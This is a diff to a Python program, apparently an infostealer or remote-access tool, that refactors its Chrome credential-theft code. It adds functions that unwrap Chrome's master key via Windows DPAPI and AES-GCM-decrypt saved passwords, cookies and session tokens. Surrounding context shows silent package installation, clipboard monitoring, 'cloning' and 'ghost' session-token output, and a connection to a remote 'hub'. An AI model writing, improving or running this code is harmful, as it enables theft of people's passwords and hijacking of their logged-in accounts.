@@ -114,6 +114,22 @@ clipboard_thread = None
 last_clipboard = ''
 
 
+def get_master_key():
+    # THE KEY TO THE WONDER: Unlocks the Chrome encryption gate
+    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
+    with open(path, "r", encoding="utf-8") as f:
+        local_state = json.load(f)
+    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+
+def decrypt_v10(value, key):
+    try:
+        iv, payload = value[3:15], value[15:]
+        cipher = AES.new(key, AES.MODE_GCM, iv)
+        return cipher.decrypt(payload)[:-16].decode()
+    except: return "[Decryption Failed]"
+
+
 def silent_bootstrap():
     """Install required packages silently if missing."""
     for package in REQUIRED_PACKAGES:
@@ -726,38 +742,9 @@ def extract_chrome_credentials():
 
             with open(local_state_path, 'r', encoding='utf-8') as f:
                 local_state = json.load(f)
-            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
-            
-            # --- OFFICIAL DPAPI UNLOCKING LOGIC ---
-            def get_master_key():
-                """Unlocks the Chrome encryption box using Windows DPAPI."""
-                path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
-                with open(path, "r", encoding="utf-8") as f:
-                    local_state = json.load(f)
-                key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
-                return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
-
             master_key = get_master_key()
             if not master_key:
                 return b"Error: DPAPI Decryption Failed."
-
-            # --- OFFICIAL STANDARD DECRYPTION FUNCTIONS ---
-            def decrypt_payload(cipher, payload):
-                return cipher.decrypt(payload)
-
-            def generate_cipher(aes_key, iv):
-                return AES.new(aes_key, AES.MODE_GCM, iv)
-
-            def decrypt_value(value, master_key):
-                """The magic that turns [Decryption Failed] into actual passwords."""
-                try:
-                    iv = value[3:15]
-                    payload = value[15:]
-                    cipher = generate_cipher(master_key, iv)
-                    decrypted_value = decrypt_payload(cipher, payload)
-                    return decrypted_value[:-16].decode()
-                except:
-                    return "[Decryption Failed]"
 
             # --- TOTAL RECOVERY SWEEP ---
             output = []
@@ -788,13 +775,8 @@ def extract_chrome_credentials():
                                 password = " [No Password Saved] "
                                 if enc_pass:
                                     try:
-                                        # Try Modern Decryption
                                         if enc_pass.startswith(b'v10') or enc_pass.startswith(b'v11'):
-                                            nonce = enc_pass[3:15]
-                                            payload = enc_pass[15:]
-                                            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
-                                            # Try to decrypt and verify the tag
-                                            password = cipher.decrypt_and_verify(payload[:-16], payload[-16:]).decode('utf-8', errors='ignore')
+                                            password = decrypt_v10(enc_pass, master_key)
                                         else:
                                             # Try Legacy DPAPI
                                             blob_in = DATA_BLOB(len(enc_pass), ctypes.create_string_buffer(enc_pass))
@@ -836,12 +818,7 @@ def extract_chrome_credentials():
                                         if not enc_val.startswith(b'v10'): continue
                                         
                                         try:
-                                            # Same AES-GCM Surgical Slice
-                                            nonce = enc_val[3:15]
-                                            payload = enc_val[15:]
-                                            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
-                                            cookie_val = cipher.decrypt_and_verify(payload[:-16], payload[-16:]).decode('utf-8', errors='ignore')
-                                            
+                                            cookie_val = decrypt_v10(enc_val, master_key)
                                             if cookie_val:
                                                 cookie_output.append(f"Host: {host} | Name: {name} | Value: {cookie_val}")
                                         except:
@@ -878,12 +855,7 @@ def extract_chrome_credentials():
                                 if not enc_val.startswith(b'v10'): continue
                                 
                                 try:
-                                    # Decrypt using your existing AES-GCM logic
-                                    nonce = enc_val[3:15]
-                                    payload = enc_val[15:]
-                                    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
-                                    decrypted_cookie = cipher.decrypt_and_verify(payload[:-16], payload[-16:]).decode('utf-8', errors='ignore')
-                                    
+                                    decrypted_cookie = decrypt_v10(enc_val, master_key)
                                     if decrypted_cookie:
                                         cloning_output.append(f"COOKIE | Host: {host} | Name: {name} | Value: {decrypted_cookie}")
                                 except:
@@ -917,12 +889,7 @@ def extract_chrome_credentials():
                                 if not enc_val.startswith(b'v10'): continue
                                 
                                 try:
-                                    # Use the SAME decryption logic you have for passwords
-                                    nonce = enc_val[3:15]
-                                    payload = enc_val[15:]
-                                    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
-                                    cookie_val = cipher.decrypt_and_verify(payload[:-16], payload[-16:]).decode('utf-8', errors='ignore')
-                                    
+                                    cookie_val = decrypt_v10(enc_val, master_key)
                                     if cookie_val:
                                         ghost_output.append(f"SESSION_TOKEN | Host: {host} | Name: {name} | Value: {cookie_val}")
                                 except:
@@ -1308,7 +1275,7 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
                                 cookie_jar.append({
                                     "domain": host,
                                     "name": name,
-                                    "value": decrypt_value(value, m_key)
+                                    "value": decrypt_v10(value, m_key)
                                 })
                             conn.close()
                             os.remove("c_tmp")
